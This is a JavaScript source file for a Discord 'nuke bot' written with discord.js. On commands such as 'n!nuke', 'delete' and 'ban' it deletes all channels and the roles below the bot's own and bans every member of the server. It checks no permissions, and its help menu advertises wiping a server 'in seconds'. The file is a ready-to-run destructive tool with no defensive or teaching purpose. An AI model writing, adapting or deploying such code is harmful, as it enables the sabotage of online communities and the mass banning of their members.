const discord = require("discord.js");
const { token, prefix } = require('./config.json');
const client = new discord.Client();

client.on("ready", () =>{
console.log(" ")
console.log(`${client.user.tag} is online.`);

});

client.on("message", async(msg)=>{

if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("your ban message here"));
}
if(msg.content.toLowerCase().startsWith(`${prefix}` + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith(`${prefix}` + "ban")){
    msg.guild.members.tap(member => member.ban("<your ban message here>"));
}
if(msg.content.toLowerCase().startsWith(`${prefix}` + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot Help Commands | .help" },
            description: `\`${prefix}help\` - To get this help menu in your DMs.\n\`${prefix}delete\` - Deletes all channels and roles of the server in seconds.`
        }
    })
}
});

client.login(token);